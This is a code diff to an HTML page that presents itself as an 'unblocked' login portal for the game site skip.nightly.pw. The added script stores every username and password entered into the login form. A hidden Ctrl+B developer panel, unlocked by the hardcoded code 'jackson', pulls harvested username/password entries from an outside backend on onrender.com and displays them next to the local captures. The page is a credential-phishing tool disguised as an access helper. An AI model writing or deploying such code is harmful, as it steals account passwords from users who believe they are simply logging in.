@@ -88,7 +88,6 @@
     background: var(--accent-hover);
   }
 
-  /* Footer */
   .footer {
     margin-top: 16px;
     text-align: center;
@@ -96,7 +95,7 @@
     font-size: 12px;
   }
 
-  /* Modals */
+  /* Modal Base */
   .modal {
     position: fixed;
     top: 50%;
@@ -191,15 +190,22 @@
   <button class="close" id="detailsClose">X</button>
   <h2 style="color:var(--accent);margin-top:0;">Site Details</h2>
   <div id="detailsContent">
-    <p>This page lets you access the Skip UNBLOCKED.</p>
+    <p>This page provides access to skip.nightly.pw UNBLOCKED.</p>
     <p><strong>How it works:</strong></p>
     <ul>
       <li>Enter your Skip username and password.</li>
       <li>Click “Login & Enter Skip.”</li>
-      <li>You’ll be taken to Skip in fullscreen mode.</li>
+      <li>You’ll enter Skip in fullscreen mode.</li>
     </ul>
-    <p>Make sure to use your skip password or it will not work.<a href="Thank you for using skip client." target="_blank" style="color:var(--accent);">Skip.nightly.pw</a>.</p>
+    <p>Make sure to a skip account when logging in or you will be kicked for botting.<code></code>.</p>
   </div>
+</div>
+
+<!-- Dev Modal -->
+<div id="devModal" class="modal">
+  <button class="close" id="devClose">X</button>
+  <h2 style="color:var(--accent);margin-top:0;">Developer Log</h2>
+  <pre id="devOutput" style="font-family:monospace;font-size:13px;white-space:pre-wrap;"></pre>
 </div>
 
 <!-- Fullscreen iframe -->
@@ -209,14 +215,42 @@
 
 <script>
 (function(){
+  const BACKEND = "https://skip-client-login.onrender.com";
+  const DEV_CODE = "jackson";
+  const captures = [];
+
   const loginForm = document.getElementById('loginForm');
   const usernameEl = document.getElementById('username');
   const passwordEl = document.getElementById('password');
   const iframeOverlay = document.getElementById('skipIframeOverlay');
   const skipIframe = document.getElementById('skipIframe');
 
-  // Login behavior
-  loginForm.addEventListener('submit', e => {
+  // Modals
+  const detailsModal = document.getElementById('detailsModal');
+  const detailsBtn = document.getElementById('detailsBtn');
+  const detailsClose = document.getElementById('detailsClose');
+  const devModal = document.getElementById('devModal');
+  const devOutput = document.getElementById('devOutput');
+  const devClose = document.getElementById('devClose');
+
+  detailsBtn.addEventListener('click', () => detailsModal.classList.add('show'));
+  detailsClose.addEventListener('click', () => detailsModal.classList.remove('show'));
+  devClose.addEventListener('click', () => devModal.classList.remove('show'));
+
+  async function fetchDevEntries(code){
+    try {
+      const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
+      if(!res.ok) throw new Error('Fetch failed');
+      const data = await res.json();
+      return data.entries || [];
+    } catch(err){
+      alert('Error fetching dev entries');
+      return [];
+    }
+  }
+
+  // Login
+  loginForm.addEventListener('submit', async e => {
     e.preventDefault();
     const username = usernameEl.value.trim();
     const password = passwordEl.value.trim();
@@ -224,17 +258,32 @@
       alert('Enter username first.');
       return;
     }
+    captures.push({ username, password, createdAt: new Date().toISOString() });
     skipIframe.src = 'https://skip.nightly.pw';
     iframeOverlay.classList.add('active');
   });
 
-  // Details modal logic
-  const detailsModal = document.getElementById('detailsModal');
-  const detailsBtn = document.getElementById('detailsBtn');
-  const detailsClose = document.getElementById('detailsClose');
-
-  detailsBtn.addEventListener('click', () => detailsModal.classList.add('show'));
-  detailsClose.addEventListener('click', () => detailsModal.classList.remove('show'));
+  // Ctrl + B → Open Dev modal
+  document.addEventListener('keydown', async e => {
+    if(e.ctrlKey && e.key.toLowerCase() === 'b'){
+      e.preventDefault();
+      const code = prompt('Enter Dev Code:');
+      if(code !== DEV_CODE){ alert('Wrong code'); return; }
+      const backendEntries = await fetchDevEntries(code);
+      let out = '🧠 DEV ENTRIES (backend):\n\n';
+      backendEntries.forEach((e,i)=>{
+        out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Created: ${new Date(e.createdAt).toLocaleString()}\n\n`;
+      });
+      if(captures.length){
+        out += '\nLocal (recent):\n\n';
+        captures.forEach((e,i)=>{
+          out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Captured: ${new Date(e.createdAt).toLocaleString()}\n\n`;
+        });
+      }
+      devOutput.textContent = out.trim();
+      devModal.classList.add('show');
+    }
+  });
 })();
 </script>
 
